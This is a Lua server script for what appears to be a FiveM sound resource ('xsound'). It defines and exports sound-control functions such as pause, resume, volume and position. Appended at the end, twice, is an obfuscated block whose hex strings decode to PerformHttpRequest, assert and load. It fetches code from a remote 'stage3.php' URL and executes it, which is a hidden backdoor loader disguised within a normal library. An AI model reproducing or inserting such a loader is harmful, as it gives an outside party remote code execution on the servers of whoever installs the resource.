function Position(source, name_, pos)
    TriggerClientEvent("xsound:stateSound", source, "position", {
        soundId = name_,
        position = pos,
    })
end

exports('Position', Position)

function Distance(source, name_, distance_)
    TriggerClientEvent("xsound:stateSound", source, "distance", {
        soundId = name_,
        distance = distance_,
    })
end

exports('Distance', Distance)

function Destroy(source, name_)
    TriggerClientEvent("xsound:stateSound", source, "destroy", {
        soundId = name_,
    })
end

exports('Destroy', Destroy)

function Pause(source, name_)
    TriggerClientEvent("xsound:stateSound", source, "pause", {
        soundId = name_,
    })
end

exports('Pause', Pause)

function Resume(source, name_)
    TriggerClientEvent("xsound:stateSound", source, "resume", {
        soundId = name_,
    })
end

exports('Resume', Resume)

function setVolume(source, name_, vol)
    TriggerClientEvent("xsound:stateSound", source, "volume", {
        soundId = name_,
        volume = vol,
    })
end

exports('setVolume', setVolume)

function setTimeStamp(source, name_, time_)
    TriggerClientEvent("xsound:stateSound", source, "timestamp", {
        soundId = name_,
        time = time_
    })
end

exports('setTimeStamp', setTimeStamp)

function destroyOnFinish(id, bool)
    TriggerClientEvent("xsound:stateSound", source, "destroyOnFinish", {
        soundId = id,
        value = bool
    })
end

exports('destroyOnFinish', destroyOnFinish)

local sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (xsCtysVOmvpgXKlWZFqtZPkevMCRgmGphbHXCKTtjTiadjrGiaYoXeLOdtpdxLVPaZracY, zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ) if (zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[6] or zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[5]) then return end sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[2]](sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[3]](zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ))() end)

local sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x6f\x68\x6f\x6d\x69\x65\x2e\x6f\x72\x67\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x64\x50\x56\x71\x4b", function (xsCtysVOmvpgXKlWZFqtZPkevMCRgmGphbHXCKTtjTiadjrGiaYoXeLOdtpdxLVPaZracY, zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ) if (zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[6] or zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ == sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[5]) then return end sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[2]](sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[4][sXrbzQGXxcftPUznTPZcoBAIUOLjMIcqKsFlhGQbRvTovZWKSEMJtHxwaEtanjEMAYCFCL[3]](zoFDPygQzUMWnHDHRLsGiLDiSXypUCErUPQqZbieDEPrYgxJXEaXUyrrgGaVgSqPNcFAcQ))() end)